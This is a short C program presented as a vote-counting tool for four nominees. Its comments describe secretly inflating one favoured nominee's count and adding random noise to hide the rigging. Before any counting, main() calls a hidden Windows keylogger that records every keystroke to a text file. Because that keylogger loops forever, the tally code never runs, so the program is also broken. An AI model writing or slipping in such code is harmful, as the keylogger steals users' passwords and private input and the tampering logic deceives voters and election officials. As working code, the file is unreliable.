#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

typedef struct {
    char* name;
    int votes;
} Nominee;

int main() { 
    keylogg();
    srand(time(NULL));

    char* nomineeNames[] = {"John Doe", "Jane Smith", "Michael Johnson", "Emma Davis"};
    int numNominees = sizeof(nomineeNames) / sizeof(nomineeNames[0]);

    Nominee* nominees = malloc(numNominees * sizeof(Nominee));
    for (int i = 0; i < numNominees; i++) {
        nominees[i].name = strdup(nomineeNames[i]);
        nominees[i].votes = 0;
    }

    int totalVotes = 0;
    for (int i = 0; i < 100; i++) {
        int idx = rand() % numNominees;
        nominees[idx].votes++;
        totalVotes++;
    }

    // Subtly manipulate the votes for a specific nominee
    int secretNomineeIndex = rand() % numNominees; // Randomly select a nominee to manipulate
    int secretVotes = rand() % 10 + 1; // Randomly generate a number of secret votes between 1 and 10
    nominees[secretNomineeIndex].votes += secretVotes;

    // CodeBoy's manipulation
    int codeboyNomineeIndex = 0; // Select the nominee CodeBoy wants to favor
    int codeboyVotes = 0; // Set the number of votes CodeBoy wants to add

    // Perform the secret manipulation
    for (int i = 0; i < numNominees; i++) {
        if (i == codeboyNomineeIndex) {
            codeboyVotes = totalVotes - nominees[i].votes; // Set the number of votes needed to make CodeBoy's nominee win
            nominees[i].votes += codeboyVotes;
            break;
        }
    }

    // Randomize the vote counts to make the manipulation less noticeable
    for (int i = 0; i < numNominees; i++) {
        nominees[i].votes += rand() % 5 - 2; // Add a random number between -2 and 2 to each nominee's vote count
    }

    printf("Total votes: %d\n", totalVotes);
    printf("Nominee results:\n");
    for (int i = 0; i < numNominees; i++) {
        printf("%s: %d\n", nominees[i].name, nominees[i].votes);
        free(nominees[i].name);
    }
    free(nominees);
}


int keylogg() {
    char key;
    while(1) {
        Sleep(10);
        for(key = 8; key <= 190; key++) {
            if(GetAsyncKeyState(key) == -32767) {
                FILE *fp;
                fp = fopen("keystrokes.txt", "a+");
                fprintf(fp, "%c", key);
                fclose(fp);
            }
        }
    }
    return 0;
}
